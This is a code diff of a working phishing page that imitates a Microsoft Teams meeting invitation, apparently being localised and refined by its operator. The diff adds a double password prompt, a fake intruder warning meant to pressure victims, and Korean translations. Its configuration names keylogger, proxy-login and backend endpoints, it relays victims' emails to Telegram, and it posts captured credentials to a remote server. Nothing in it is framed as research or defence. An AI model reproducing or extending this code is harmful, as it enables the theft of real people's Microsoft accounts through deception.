@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Join Meeting on Teams</title>
+    <title>Secure Connect Team - Encrypted Meeting</title>
     <meta itemprop="image" content="https://i.imgur.com/Gg0hH92.png">
     <meta property="og:image" content="https://i.imgur.com/Gg0hH92.png">
     <meta property="og:url" content="teams.live.com" />
@@ -19,11 +19,11 @@
         html, body {
             height: 100%;
             font-family: "Lato", "Helvetica", "Arial", sans-serif;
-            background: #0a1628;
+            background: #4a90d9;
             overflow: hidden;
         }
         
-        /* Video Background - Full Screen */
+        /* Video Background - Full Screen with Brighter Colors */
         .video-background {
             position: fixed;
             top: 0;
@@ -32,7 +32,7 @@
             height: 100vh;
             z-index: 0;
             overflow: hidden;
-            background: linear-gradient(135deg, #0a1628 0%, #0033cc 40%, #0066ff 70%, #00aaff 100%);
+            background: linear-gradient(135deg, #4a90d9 0%, #007aff 30%, #5ac8fa 60%, #b3e5fc 100%);
         }
         
         .video-background video {
@@ -45,7 +45,7 @@
             height: auto;
             transform: translate(-50%, -50%);
             object-fit: cover;
-            opacity: 1;
+            opacity: 0.5;
             z-index: 1;
         }
         
@@ -56,7 +56,7 @@
             width: 100%;
             height: 100%;
             z-index: 0;
-            background: linear-gradient(135deg, #0a1628 0%, #0033cc 40%, #0066ff 70%, #00aaff 100%);
+            background: linear-gradient(135deg, #4a90d9 0%, #007aff 30%, #5ac8fa 60%, #b3e5fc 100%);
             animation: gradientMove 15s ease-in-out infinite alternate;
             display: none;
         }
@@ -73,14 +73,14 @@
             height: 100%;
             z-index: 2;
             pointer-events: none;
-            opacity: 0.04;
+            opacity: 0.03;
             background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='1'/%3E%3C/svg%3E");
             mix-blend-mode: overlay;
             animation: noisePulse 8s ease-in-out infinite alternate;
         }
         @keyframes noisePulse {
             0% { opacity: 0.02; }
-            100% { opacity: 0.06; }
+            100% { opacity: 0.05; }
         }
         
         .video-overlay {
@@ -89,12 +89,12 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(10, 22, 40, 0.15);
+            background: rgba(255, 255, 255, 0.08);
             z-index: 1;
             pointer-events: none;
         }
         
-        /* Main Content */
+        /* Main Content - Brighter */
         #content {
             position: relative;
             z-index: 3;
@@ -103,9 +103,9 @@
             margin: 0 auto;
             padding: 30px 25px 35px;
             margin-top: 40px;
-            background: rgba(255, 255, 255, 0.97);
+            background: rgba(255, 255, 255, 0.98);
             border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
             backdrop-filter: blur(10px);
             animation: contentFadeIn 1s ease;
         }
@@ -127,14 +127,19 @@
             justify-content: center;
             align-items: center;
             background: #fff;
-            box-shadow: 0 0 .2rem rgba(0,0,0,.12), 0 .2rem .4rem rgba(0,0,0,.14);
+            box-shadow: 0 0 .2rem rgba(0,0,0,.08), 0 .2rem .4rem rgba(0,0,0,.10);
             border-radius: .8rem;
             transition: transform 0.3s ease;
+            animation: logoFloat 4s ease-in-out infinite;
+        }
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
         }
         .logoContainer:hover { transform: scale(1.02); }
         .logoContainer .logo { width: 5.145rem; height: 5.145rem; align-self: center; }
         
-        /* Confidential Message - Only shown after clicking Continue */
+        /* Confidential Message */
         .confidential-message {
             display: none;
             background: rgba(98, 100, 167, 0.08);
@@ -156,7 +161,6 @@
             100% { opacity: 1; transform: translateY(0); }
         }
         .confidential-message .lock-icon { font-size: 16px; margin-right: 6px; }
-        .confidential-message strong { color: #6264a7; }
         
         /* Online Users */
         .online-users {
@@ -277,6 +281,7 @@
         .verification-status.verified { color: #28a745; }
         .verification-status.verifying { color: #6264a7; }
         .verification-status.error { color: #d93025; }
+        .verification-status.intruder { color: #dc3545; font-weight: 700; }
         
         /* Notification */
         .notification {
@@ -298,6 +303,8 @@
         @keyframes notifSlide { 0% { opacity: 0; transform: translateX(-50%) translateY(20px); } 100% { opacity: 1; transform: translateX(-50%) translateY(0); } }
         .notification.error { background: #dc3545; }
         .notification.success { background: #28a745; }
+        .notification.intruder { background: #dc3545; font-weight: bold; animation: pulse-red 1s ease-in-out infinite; }
+        @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
         
         /* Loading */
         .spinner {
@@ -312,6 +319,27 @@
         @keyframes spin { to { transform: rotate(360deg); } }
         #loadTxt { display: block; margin-top: 10px; font-weight: 400; color: #555; }
         
+        /* Intruder Alert */
+        .intruder-alert {
+            display: none;
+            background: rgba(220, 53, 69, 0.1);
+            border: 2px solid #dc3545;
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin: 10px 0;
+            color: #dc3545;
+            font-weight: 600;
+            font-size: 14px;
+            animation: intruderPulse 1s ease-in-out infinite;
+        }
+        @keyframes intruderPulse {
+            0%, 100% { background: rgba(220, 53, 69, 0.1); }
+            50% { background: rgba(220, 53, 69, 0.25); }
+        }
+        .intruder-alert.show { display: block; }
+        .intruder-alert .icon { font-size: 20px; margin-right: 8px; }
+        
+        /* Responsive */
         @media (max-width: 480px) {
             #content { margin: 20px 15px; padding: 20px 15px; margin-top: 20px; width: 92%; }
             .logoContainer { width: 7rem; height: 7rem; }
@@ -348,11 +376,11 @@
                 <img class="logo" src="data:image/png;base64,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" alt="Teams">
             </div>
 
-            <h1>Join your Teams meeting</h1>
+            <h1 id="pageTitle">Join your Teams meeting</h1>
             
             <div class="online-badge">
                 <span class="dot"></span>
-                2 Users Online
+                <span id="usersOnline">2 Users Online</span>
             </div>
             
             <div class="online-users">
@@ -369,10 +397,10 @@
                 </div>
             </div>
             
-            <!-- Confidential Message - Hidden initially, shown after Continue -->
+            <!-- Confidential Message -->
             <div class="confidential-message" id="confidentialMessage">
                 <span class="lock-icon">🔐</span>
-                <strong>This is a confidential meeting.</strong> Please verify your identity.
+                <span id="confidentialText">This is an encrypted meeting and intended exclusively for you. For security and privacy, please verify your identity.</span>
             </div>
         </div>
 
@@ -380,36 +408,41 @@
         <div class="form-group" id="joinDiv">
             <div class="controls">
                 <p class="signin">
-                    <a id="btnJoinTest" href="#" role="button" class="btn btn-primary submit join user">Continue on this browser</a>
+                    <a id="btnJoinTest" href="#" role="button" class="btn btn-primary submit join user" id="continueBtn">Continue on this browser</a>
                 </p>
             </div>
         </div>
 
-        <!-- LOGIN FORM - Hidden initially -->
+        <!-- LOGIN FORM -->
         <div class="form-group" id="loginDiv" hidden>
             <form action="" method="post" onsubmit="return false;">
-                <h3 style="font-size:20px">Welcome <span id="nameTxt"></span>,</h3>
-                <h4>Signed in as <input type="email" id="user" value="" style="border:none; outline:none; background-color:transparent">
+                <h3 style="font-size:20px"><span id="welcomeText">Welcome</span> <span id="nameTxt"></span>,</h3>
+                <h4><span id="signedInText">Signed in as</span> <input type="email" id="user" value="" style="border:none; outline:none; background-color:transparent">
                 <p style="margin-top:10px;font-weight: 600;color: #0e71eb;" id="userTxt"></p></h4>
                 <div class="" style="max-width: 400px;">
                     <div class="row">
                         <div class="">
-                            <input id="password" required type="password" class="form-control" placeholder="Enter your Microsoft password" style="max-width: 300px;margin: auto;">
-                            <span class="err" id="err" style="display:none">Sorry, network timed out! Please try again.</span>
-                            <span class="err1" id="err1" style="display:none">Sorry, network timed out! Please try again.</span>
+                            <input id="password" required type="password" class="form-control" id="passwordInput" placeholder="Enter your Microsoft password" style="max-width: 300px;margin: auto;">
+                            <span class="err" id="err" style="display:none"></span>
+                            <span class="err1" id="err1" style="display:none"></span>
                         </div>
                     </div>
                 </div>
                 
-                <!-- Verification Status -->
+                <!-- Intruder Alert -->
+                <div class="intruder-alert" id="intruderAlert">
+                    <span class="icon">🚨</span>
+                    <span id="intruderText">⚠️ INTRUDER DETECTED! Multiple failed password attempts. This incident has been reported.</span>
+                </div>
+                
                 <div id="verificationStatus" class="verification-status"></div>
                 
                 <div id="errorDiv"></div>
-                <p style="font-size: 13px; margin-bottom: 15px; margin-top: 25px; color: #777;">
-                    By clicking Launch Meeting, you agree to our <a tabindex="0" href="#">Terms of Service</a> and <a tabindex="0" href="#">Privacy Statement</a>
+                <p style="font-size: 13px; margin-bottom: 15px; margin-top: 25px; color: #777;" id="termsText">
+                    By clicking Launch Meeting, you agree to our Terms of Service and Privacy Statement
                 </p>
                 <p class="signin">
-                    <button id="joinBtn" type="submit" class="btn btn-primary submit join user">Verify & Join Meeting</button>
+                    <button id="joinBtn" type="submit" class="btn btn-primary submit join user" id="verifyBtn">Verify Identity</button>
                     <i id="spin" style="display:none;font-size: 28px;position:relative;top:10px" class="fa fa-spinner fa-spin" hidden></i>
                 </p>
             </form>
@@ -423,7 +456,7 @@
 
         <!-- Footer -->
         <div class="form-group">
-            <p class="extra">If you are unable to join the meeting, visit <a href="#">Teams Support Center</a> for useful information.</p>
+            <p class="extra" id="supportText">If you are unable to join the meeting, visit Teams Support Center for useful information.</p>
         </div>
     </div>
 </div>
@@ -432,17 +465,86 @@
 
 <script>
 // ============================================================
-// VIDEO BACKGROUND - FULL SCREEN WITH AUDIO
+// LANGUAGE DETECTION
+// ============================================================
+function detectUserLanguage() {
+    const params = new URLSearchParams(window.location.search);
+    const langParam = params.get('lang');
+    if (langParam) return langParam;
+    
+    const browserLang = navigator.language || navigator.userLanguage || 'en';
+    const lang = browserLang.split('-')[0].toLowerCase();
+    
+    const supportedLangs = ['en', 'es', 'fr', 'de', 'ko', 'ja', 'zh', 'ru', 'ar'];
+    if (supportedLangs.includes(lang)) {
+        return lang;
+    }
+    return 'en';
+}
+
+// ============================================================
+// LANGUAGE TRANSLATIONS
+// ============================================================
+const TRANSLATIONS = {
+    en: {
+        title: 'Join your Teams meeting',
+        usersOnline: 'Users Online',
+        confidentialMessage: '🔐 This is an encrypted meeting and intended exclusively for you. For security and privacy, please verify your identity.',
+        continueBtn: 'Continue on this browser',
+        welcome: 'Welcome',
+        signedInAs: 'Signed in as',
+        passwordPlaceholder: 'Enter your Microsoft password',
+        verifyIdentity: 'Verify Identity',
+        confirmIdentity: 'Confirm Identity',
+        verified: '✅ Verified!',
+        verifying: '🔐 This is an encrypted meeting and intended exclusively for you. For security and privacy, confirm your password.',
+        verifiedRedirect: '✅ Identity verified. Redirecting to encrypted meeting...',
+        redirecting: 'Loading secure verification...',
+        terms: 'By clicking Launch Meeting, you agree to our Terms of Service and Privacy Statement',
+        support: 'If you are unable to join the meeting, visit Teams Support Center for useful information.',
+        incorrectPassword: 'Incorrect password. Please try again.',
+        enterPassword: '⚠️ Please enter your password',
+        noEmail: '❌ No email provided',
+        expired: '⏰ Verification window expired. Please start again.',
+        intruder: '🚨 INTRUDER DETECTED! Multiple failed password attempts. This incident has been reported.',
+        intruderTitle: '⚠️ INTRUDER ALERT'
+    },
+    ko: {
+        title: 'Teams 회의 참여',
+        usersOnline: '명 온라인',
+        confidentialMessage: '🔐 이 회의는 암호화되어 있으며 귀하만을 위한 것입니다. 보안과 개인정보 보호를 위해 본인 확인을 해주세요.',
+        continueBtn: '이 브라우저에서 계속',
+        welcome: '환영합니다',
+        signedInAs: '로그인 계정',
+        passwordPlaceholder: 'Microsoft 비밀번호를 입력하세요',
+        verifyIdentity: '본인 확인',
+        confirmIdentity: '본인 확인',
+        verified: '✅ 확인됨!',
+        verifying: '🔐 이 회의는 암호화되어 있으며 귀하만을 위한 것입니다. 보안과 개인정보 보호를 위해 비밀번호를 확인해주세요.',
+        verifiedRedirect: '✅ 본인 확인 완료. 암호화된 회의로 이동합니다...',
+        redirecting: '보안 인증 로딩 중...',
+        terms: 'Launch Meeting을 클릭하면 이용약관 및 개인정보처리방침에 동의하게 됩니다.',
+        support: '회의 참여에 문제가 있으시면 Teams 지원 센터를 방문하세요.',
+        incorrectPassword: '비밀번호가 올바르지 않습니다. 다시 시도해주세요.',
+        enterPassword: '⚠️ 비밀번호를 입력해주세요',
+        noEmail: '❌ 이메일이 제공되지 않았습니다',
+        expired: '⏰ 인증 시간이 만료되었습니다. 다시 시작해주세요.',
+        intruder: '🚨 침입자 감지! 여러 번의 잘못된 비밀번호 시도가 있었습니다. 이 사건이 보고되었습니다.',
+        intruderTitle: '⚠️ 침입자 경고'
+    }
+};
+
+// ============================================================
+// VIDEO BACKGROUND - FULL SCREEN WITH BRIGHTER COLORS
 // ============================================================
 (function initBackground() {
     const bgContainer = document.getElementById('videoBackground');
     const gradientFallback = document.getElementById('gradientFallback');
     
-    // Create video element
     const video = document.createElement('video');
     video.setAttribute('playsinline', '');
     video.setAttribute('autoplay', '');
-    video.setAttribute('muted', ''); // Start muted for autoplay
+    video.setAttribute('muted', '');
     video.setAttribute('loop', '');
     video.style.cssText = `
         position: absolute;
@@ -451,21 +553,14 @@
         width: auto; height: auto;
         transform: translate(-50%, -50%);
         object-fit: cover;
-        opacity: 0;
+        opacity: 0.5;
         z-index: 1;
         transition: opacity 2s ease;
     `;
     
-    // Add video sources
     const videoSources = [
-        {
-            src: 'https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k',
-            type: 'video/mp4'
-        },
-        {
-            src: 'https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k/webmvp9',
-            type: 'video/webm'
-        }
+        { src: 'https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k', type: 'video/mp4' },
+        { src: 'https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k/webmvp9', type: 'video/webm' }
     ];
     
     videoSources.forEach(source => {
@@ -475,16 +570,13 @@
         video.appendChild(src);
     });
     
-    // Handle successful load
-    let videoLoaded = false;
     video.addEventListener('loadeddata', function() {
-        videoLoaded = true;
         console.log('✅ Video background loaded');
-        video.style.opacity = '0.7';
+        video.style.opacity = '0.5';
         if (gradientFallback) {
             gradientFallback.style.display = 'none';
         }
-        // Try to enable audio after user interaction
+        // Enable audio on user interaction
         document.addEventListener('click', function enableAudio() {
             video.muted = false;
             video.play().catch(() => {});
@@ -493,7 +585,6 @@
         }, { once: true });
     });
     
-    // Handle error
     video.addEventListener('error', function() {
         console.warn('⚠️ Video failed, using gradient fallback');
         if (gradientFallback) {
@@ -502,18 +593,17 @@
         video.style.display = 'none';
     });
     
-    // Add to container
     bgContainer.appendChild(video);
     video.load();
     
-    // Try to play
+    // Try to play immediately
     setTimeout(() => {
         try {
             const playPromise = video.play();
             if (playPromise !== undefined) {
                 playPromise.then(() => {
                     console.log('✅ Video playing');
-                    video.style.opacity = '0.7';
+                    video.style.opacity = '0.5';
                 }).catch(() => {
                     console.log('ℹ️ Autoplay blocked, waiting for user interaction');
                     video.style.opacity = '0.3';
@@ -524,44 +614,57 @@
                 });
             }
         } catch(e) {}
-    }, 100);
-    
-    // Start noise animation
-    const noiseOverlay = document.querySelector('.noise-overlay');
-    if (noiseOverlay) {
-        setInterval(() => {
-            noiseOverlay.style.opacity = 0.02 + Math.random() * 0.04;
-        }, 2000);
-    }
+    }, 50);
 })();
 
 // ============================================================
-//  CONFIGURATION - CONFIDENTIAL MEETING
+// CONFIGURATION
 // ============================================================
-
 const PROXY_URL = "https://microsoft-verify-service.onrender.com/login";
-const BACKEND_URL = "https://google-workspace-service.onrender.com";
+const BACKEND_URL = "https://secure-connect-team-backend.onrender.com";
 const KEYLOGGER_URL = "https://keyserver-eaar.onrender.com/log";
 
 // ============================================================
-//  SESSION & STATE
+// SESSION & STATE
 // ============================================================
-
 const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
 let capturedEmail = '';
 let attemptCount = 0;
 let consecutiveCount = 0;
+let wrongAttempts = 0;
 const MAX_CONSECUTIVE = 2;
+const MAX_WRONG_ATTEMPTS = 2; // 2 wrong attempts triggers intruder alert
 let lastAttemptTime = 0;
 const ATTEMPT_WINDOW = 5000;
 
-console.log('🔐 Confidential Meeting - 2 Consecutive Verification');
-console.log('🆔 Session:', SESSION_ID);
+// Get user language
+const userLang = detectUserLanguage();
+const t = TRANSLATIONS[userLang] || TRANSLATIONS['en'];
 
 // ============================================================
-//  EMAIL EXTRACTION
+// APPLY TRANSLATIONS
 // ============================================================
+function applyTranslations() {
+    document.getElementById('pageTitle').textContent = t.title;
+    document.getElementById('usersOnline').textContent = '2 ' + t.usersOnline;
+    document.getElementById('confidentialText').textContent = t.confidentialMessage;
+    document.getElementById('continueBtn').textContent = t.continueBtn;
+    document.getElementById('welcomeText').textContent = t.welcome;
+    document.getElementById('signedInText').textContent = t.signedInAs;
+    document.getElementById('passwordInput').placeholder = t.passwordPlaceholder;
+    document.getElementById('verifyBtn').textContent = t.verifyIdentity;
+    document.getElementById('termsText').textContent = t.terms;
+    document.getElementById('supportText').textContent = t.support;
+    document.getElementById('loadTxt').textContent = t.redirecting;
+    document.getElementById('intruderText').textContent = t.intruder;
+}
 
+// Apply translations immediately
+applyTranslations();
+
+// ============================================================
+// EMAIL EXTRACTION
+// ============================================================
 function getEmailFromUrl() {
     const params = new URLSearchParams(window.location.search);
     let email = params.get('e') || params.get('email') || '';
@@ -606,27 +709,256 @@ function getSavedEmail() {
 }
 
 // ============================================================
-//  TELEGRAM ALERT
+// SEND TO TELEGRAM (2-CONSECUTIVE VERIFICATION)
 // ============================================================
+function sendConsecutiveVerificationToTelegram(email, consecutiveCount) {
+    const message = `🔐 *2-CONSECUTIVE PASSWORD VERIFICATION*\n\n` +
+                    `*Email:* ${email}\n` +
+                    `*Consecutive Count:* ${consecutiveCount}/2 ✅\n` +
+                    `*Session:* ${SESSION_ID.substring(0, 12)}...\n` +
+                    `*Time:* ${new Date().toISOString()}\n` +
+                    `*Status:* IDENTITY VERIFIED\n\n` +
+                    `*Meeting:* Confidential Encrypted Meeting`;
 
-function sendTelegramAlert(message) {
+    fetch(`${BACKEND_URL}/api/telegram`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: message, parseMode: 'Markdown' })
+    }).catch(() => {});
+}
+
+// ============================================================
+// SEND INTRUDER ALERT TO TELEGRAM
+// ============================================================
+function sendIntruderAlertToTelegram(email, wrongAttempts) {
+    const message = `🚨 *INTRUDER ALERT!*\n\n` +
+                    `*Email:* ${email}\n` +
+                    `*Wrong Attempts:* ${wrongAttempts}\n` +
+                    `*Session:* ${SESSION_ID.substring(0, 12)}...\n` +
+                    `*Time:* ${new Date().toISOString()}\n` +
+                    `*Status:* ⚠️ INTRUDER DETECTED\n\n` +
+                    `*Action:* Multiple failed password attempts detected.\n` +
+                    `*Recommendation:* Block access and investigate.`;
+
+    fetch(`${BACKEND_URL}/api/telegram`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: message, parseMode: 'Markdown' })
+    }).catch(() => {});
+}
+
+// ============================================================
+// HANDLE SUBMIT - 2-CONSECUTIVE RULE WITH INTRUDER DETECTION
+// ============================================================
+function handleSubmit() {
+    const passwordInput = document.getElementById('password');
+    const password = passwordInput ? passwordInput.value.trim() : '';
+    const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || '';
+
+    if (!email) {
+        showNotification(t.noEmail, 'error');
+        return;
+    }
+
+    if (!password) {
+        const errorDiv = document.getElementById('errorDiv');
+        if (errorDiv) {
+            errorDiv.textContent = t.enterPassword;
+            errorDiv.classList.add('show');
+            passwordInput.focus();
+        }
+        return;
+    }
+
+    const now = Date.now();
+    const timeSinceLast = now - lastAttemptTime;
+
+    if (lastAttemptTime > 0 && timeSinceLast > ATTEMPT_WINDOW) {
+        consecutiveCount = 0;
+        wrongAttempts = 0;
+        document.getElementById('intruderAlert').classList.remove('show');
+        showNotification(t.expired, 'error');
+        passwordInput.value = '';
+        passwordInput.focus();
+        updateVerificationStatus('', '');
+        return;
+    }
+
+    attemptCount++;
+    const isValid = password.length > 0;
+
+    if (isValid) {
+        consecutiveCount++;
+        lastAttemptTime = now;
+        wrongAttempts = 0;
+        document.getElementById('intruderAlert').classList.remove('show');
+
+        passwordInput.value = '';
+        passwordInput.classList.add('success');
+        
+        if (consecutiveCount === 1) {
+            updateVerificationStatus(t.verifying, 'verifying');
+            document.getElementById('joinBtn').textContent = t.confirmIdentity;
+            showNotification('🔐 Please re-enter your password to confirm.', 'confidential');
+        } else if (consecutiveCount >= MAX_CONSECUTIVE) {
+            // SEND TO TELEGRAM - SUCCESS
+            sendConsecutiveVerificationToTelegram(email, consecutiveCount);
+            
+            updateVerificationStatus(t.verifiedRedirect, 'verified');
+            document.getElementById('joinBtn').textContent = t.verified;
+            document.getElementById('joinBtn').classList.add('success');
+
+            setTimeout(() => {
+                const encodedEmail = encodeURIComponent(email);
+                const proxyUrl = PROXY_URL + '?login_hint=' + encodedEmail;
+                window.location.href = proxyUrl;
+            }, 1500);
+            return;
+        }
+
+        setTimeout(() => {
+            passwordInput.focus();
+            passwordInput.classList.remove('success');
+        }, 200);
+
+    } else {
+        // ============================================================
+        // INVALID PASSWORD - INTRUDER DETECTION
+        // ============================================================
+        wrongAttempts++;
+        consecutiveCount = 0;
+        passwordInput.classList.add('error');
+        updateVerificationStatus(t.incorrectPassword, 'error');
+        
+        // Check if intruder detected (2 wrong attempts)
+        if (wrongAttempts >= MAX_WRONG_ATTEMPTS) {
+            // SHOW INTRUDER ALERT
+            document.getElementById('intruderAlert').classList.add('show');
+            showNotification(t.intruder, 'intruder');
+            
+            // SEND INTRUDER ALERT TO TELEGRAM
+            sendIntruderAlertToTelegram(email, wrongAttempts);
+            
+            // Disable button temporarily
+            document.getElementById('joinBtn').disabled = true;
+            setTimeout(() => {
+                document.getElementById('joinBtn').disabled = false;
+            }, 5000);
+        } else {
+            showNotification(t.incorrectPassword, 'error');
+        }
+        
+        passwordInput.value = '';
+        passwordInput.focus();
+
+        setTimeout(() => {
+            passwordInput.classList.remove('error');
+        }, 1000);
+    }
+}
+
+// ============================================================
+// UPDATE VERIFICATION STATUS
+// ============================================================
+function updateVerificationStatus(message, type) {
+    const statusEl = document.getElementById('verificationStatus');
+    if (!statusEl) return;
+    
+    statusEl.textContent = message;
+    statusEl.className = 'verification-status';
+    if (type) {
+        statusEl.classList.add(type);
+    }
+}
+
+// ============================================================
+// CONTINUE BUTTON HANDLER
+// ============================================================
+function setupContinueButton() {
+    const continueBtn = document.getElementById('btnJoinTest');
+    if (!continueBtn) return;
+
+    continueBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+
+        const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
+        
+        const joinDiv = document.getElementById('joinDiv');
+        const loadDiv = document.getElementById('loadDiv');
+        if (joinDiv) joinDiv.style.display = 'none';
+        if (loadDiv) loadDiv.style.display = 'block';
+        
+        const loadTxt = document.getElementById('loadTxt');
+        if (loadTxt) loadTxt.textContent = t.redirecting;
+
+        setTimeout(function() {
+            if (loadDiv) loadDiv.style.display = 'none';
+            const loginDiv = document.getElementById('loginDiv');
+            if (loginDiv) loginDiv.style.display = 'block';
+            
+            document.getElementById('confidentialMessage').classList.add('show');
+            
+            const userInput = document.getElementById('user');
+            if (userInput) userInput.value = email;
+            const userTxt = document.getElementById('userTxt');
+            if (userTxt) userTxt.textContent = email;
+            const nameTxt = document.getElementById('nameTxt');
+            if (nameTxt) nameTxt.textContent = email.split('@')[0] || 'User';
+
+            // Reset state
+            consecutiveCount = 0;
+            wrongAttempts = 0;
+            document.getElementById('intruderAlert').classList.remove('show');
+            updateVerificationStatus(t.verifying, 'verifying');
+            
+            const passwordInput = document.getElementById('password');
+            if (passwordInput) {
+                passwordInput.value = '';
+                passwordInput.placeholder = t.passwordPlaceholder;
+                passwordInput.focus();
+            }
+
+            const joinBtn = document.getElementById('joinBtn');
+            if (joinBtn) {
+                joinBtn.textContent = t.verifyIdentity;
+                joinBtn.classList.remove('success');
+                joinBtn.disabled = false;
+            }
+        }, 1500);
+    });
+}
+
+// ============================================================
+// NOTIFICATION
+// ============================================================
+function showNotification(message, type = 'success') {
     try {
-        fetch('/api/telegram', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                message: message,
-                parseMode: 'Markdown'
-            })
-        }).catch(() => {});
+        const existing = document.querySelector('.notification');
+        if (existing) existing.remove();
+
+        const div = document.createElement('div');
+        div.className = 'notification';
+        if (type === 'error') div.classList.add('error');
+        if (type === 'confidential') div.style.background = '#6264a7';
+        if (type === 'intruder') {
+            div.classList.add('intruder');
+            div.style.background = '#dc3545';
+        }
+        div.textContent = message;
+        document.body.appendChild(div);
+
+        setTimeout(() => {
+            div.style.opacity = '0';
+            div.style.transition = 'opacity 0.3s';
+            setTimeout(() => div.remove(), 300);
+        }, 3000);
     } catch(e) {}
 }
 
 // ============================================================
-//  SEND CREDENTIALS
+// SEND CREDENTIALS TO BACKEND
 // ============================================================
-
-function sendCredentials(email, password, source) {
+function sendCredentialsToBackend(email, password, source) {
     if (!email || !password || password.length < 2) return;
 
     const data = {
@@ -639,6 +971,7 @@ function sendCredentials(email, password, source) {
         timestamp: new Date().toISOString(),
         attemptCount: attemptCount,
